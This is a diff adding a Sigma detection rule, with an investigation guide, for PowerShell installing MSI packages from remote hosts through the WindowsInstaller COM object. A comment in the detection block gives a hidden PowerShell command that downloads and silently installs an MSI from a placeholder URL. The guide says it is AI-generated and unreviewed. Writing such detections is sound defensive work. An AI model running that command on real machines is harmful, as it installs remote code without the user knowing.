@@ -1,0 +1,70 @@
+title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
+id: 222720a7-047f-4054-baa5-bab9be757db0
+status: experimental
+description: |
+  Detects the execution of PowerShell commands that attempt to install MSI packages via the
+  Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
+  This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
+  And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
+references:
+- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
+- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
+- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
+author: Meroujan Antonyan (vx3r)
+date: 2025-06-05
+tags:
+- attack.execution
+- attack.t1059.001
+- attack.defense-evasion
+- attack.t1218
+- attack.command-and-control
+- attack.t1105
+logsource:
+  category: process_creation
+  product: windows
+detection:
+    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
+  selection_img:
+  - Image|endswith:
+    - '\powershell_ise.exe'
+    - '\powershell.exe'
+    - '\pwsh.exe'
+  - OriginalFileName:
+    - 'PowerShell_ISE.EXE'
+    - 'PowerShell.EXE'
+    - 'pwsh.dll'
+  selection_cli:
+    CommandLine|contains|all:
+    - '-ComObject'
+    - 'InstallProduct('
+  selection_remote:
+    CommandLine|contains:
+    - 'http'
+    - '\\\\'
+  filter_main_localhost:
+    CommandLine|contains:
+    - '://127.0.0.1'
+    - '://localhost'
+  condition: all of selection_* and not 1 of filter_main_*
+falsepositives:
+- Unknown
+level: medium
+note: |
+  ### Technical Context
+  This detection rule identifies the execution of PowerShell commands utilizing the Windows Installer COM object (`WindowsInstaller.Installer`) to install MSI packages from remote locations. This behavior may indicate a malicious actor attempting software deployment on a victim machine or lateral movement within the network by exploiting the Windows Installer functionality. Notably, attackers may prefer using the COM object over the standard `msiexec` utility to evade typical detection mechanisms that monitor executable paths.
+
+  The relevant MITRE ATT&CK tactics associated with this detection include **Execution** (TA0002) through techniques such as **PowerShell** (T1059.001) and **Defense Evasion** (TA0005) via the **Windows Installer** (T1218). The potential objective of the attacker in this scenario is to gain persistence on the system or establish a foothold to execute further malicious payloads. Telemetry from **process creation** events is the primary data source that will provide insight into these suspicious activities.
+
+  ### Investigation Steps
+  - **Review Process Creation Logs:** Analyze process creation logs for instances where PowerShell commands invoke the Windows Installer COM object, specifically looking for command lines containing `-ComObject` and `InstallProduct(`.
+  - **Investigate Command Line Parameters:** Validate the command-line parameters for the originating PowerShell process, ensuring the use of `http` or UNC paths suggests remote file access. Check for anomalies in the source of the MSI package being installed.
+  - **Correlate with Network Activity:** Check associated network traffic logs to identify any connections to external servers from which the MSI package may have been downloaded, ensuring there are no indicators of command-and-control (C2) communications.
+  - **Detect File System Changes:** Monitor for any changes to file systems where MSI packages are typically installed (e.g., `C:\Program Files\` or `C:\Program Files (x86)\`) to track potential malicious installations initiated by the detected PowerShell command.
+
+  ### Prioritization
+  The severity of this alert is medium due to the potential impact of unauthorized software installations and lateral movement within the network, which can lead to significant risk exposure. The likelihood is considered reasonable given the common use of PowerShell in both legitimate administrative tasks and malicious exploitation scenarios.
+
+  ### Blind Spots and Assumptions
+  Gaps in detection coverage may arise from scenarios where PowerShell is executed with elevated permissions, potentially circumventing standard logging mechanisms. The detection logic assumes that relevant logs for process creation and command-line arguments are adequately configured and preserved, which may not always be the case in all environments. Additionally, alerts may be missed if the attacker uses different methods to interact with the Windows Installer service or if they operate from non-standard environments that don’t log these events effectively.
+
+  > **Disclaimer:** This investigation guide was created using generative AI technology and has not been reviewed for its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit specific environments and operational needs. Please communicate any changes to the detection engineering team.
